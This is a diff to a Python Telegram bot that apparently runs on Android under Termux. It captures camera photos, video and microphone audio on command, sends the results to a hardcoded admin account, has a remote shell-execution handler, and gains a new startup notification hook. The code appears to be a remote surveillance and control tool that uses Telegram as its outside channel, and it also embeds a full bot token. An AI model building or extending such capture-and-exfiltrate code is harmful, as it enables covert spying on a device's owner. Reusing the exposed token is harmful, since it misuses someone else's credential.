@@ -16,7 +16,7 @@ from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, Messa
 # --- 配置区域 ---
 BOT_TOKEN = "8091415322:AAFuS0PJKnu8hi0WHwXoSqHuJTZJNRFzzS4"
 ADMIN_ID = 1878794912
-MEDIA_DIR = "captured_media"  # 媒体文件保存目录
+MEDIA_DIR = os.path.abspath("captured_media")  # 使用绝对路径更安全
 # ----------------
 
 # 配置日志
@@ -69,6 +69,20 @@ def check_api_availability():
     termux_path = "/data/data/com.termux/files/usr/bin/" + cmd_name
     is_available = shutil.which(cmd_name) is not None or os.path.exists(termux_path)
     return is_available
+
+# --- Bot 启动后钩子 ---
+async def post_init(application: ApplicationBuilder):
+    """Bot 启动完成后执行"""
+    try:
+        # 启动时通知管理员
+        distro = get_distro_name()
+        await application.bot.send_message(
+            chat_id=ADMIN_ID, 
+            text=f"🤖 **Bot 已成功上线**\n🌍 环境: {distro}\n📂 目录: {MEDIA_DIR}",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.error(f"Failed to send startup message: {e}")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -171,7 +185,7 @@ async def capture_media(update: Update, context: ContextTypes.DEFAULT_TYPE, medi
     
     # 根据类型配置命令
     if media_type == "photo":
-        filename = f"{MEDIA_DIR}/photo_{timestamp}.jpg"
+        filename = os.path.join(MEDIA_DIR, f"photo_{timestamp}.jpg")
         cmd_base = "termux-camera-photo -c 0"
         path_base = "/data/data/com.termux/files/usr/bin/termux-camera-photo -c 0"
         cmd = f"{cmd_base} {filename}"
@@ -180,7 +194,7 @@ async def capture_media(update: Update, context: ContextTypes.DEFAULT_TYPE, medi
         timeout_val = 10
         
     elif media_type == "video":
-        filename = f"{MEDIA_DIR}/video_{timestamp}.mp4"
+        filename = os.path.join(MEDIA_DIR, f"video_{timestamp}.mp4")
         duration = 5
         cmd_base = f"termux-camera-record -c 0 -l {duration}"
         path_base = f"/data/data/com.termux/files/usr/bin/termux-camera-record -c 0 -l {duration}"
@@ -190,7 +204,7 @@ async def capture_media(update: Update, context: ContextTypes.DEFAULT_TYPE, medi
         timeout_val = 15
 
     elif media_type == "audio":
-        filename = f"{MEDIA_DIR}/audio_{timestamp}.m4a" # m4a 格式通常兼容性较好
+        filename = os.path.join(MEDIA_DIR, f"audio_{timestamp}.m4a")
         duration = 10
         # termux-microphone-record -l <seconds> -f <file>
         cmd_base = f"termux-microphone-record -l {duration} -e aac"
@@ -240,7 +254,7 @@ async def capture_media(update: Update, context: ContextTypes.DEFAULT_TYPE, medi
 async def clean_media_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_admin(update.effective_user.id): return
     
-    files = glob.glob(f"{MEDIA_DIR}/*")
+    files = glob.glob(os.path.join(MEDIA_DIR, "*"))
     count = len(files)
     
     if count == 0:
@@ -375,7 +389,7 @@ async def exec_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     print(f"Bot 启动... Admin: {ADMIN_ID}")
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
 
     # 命令处理器
     app.add_handler(CommandHandler("start", start))
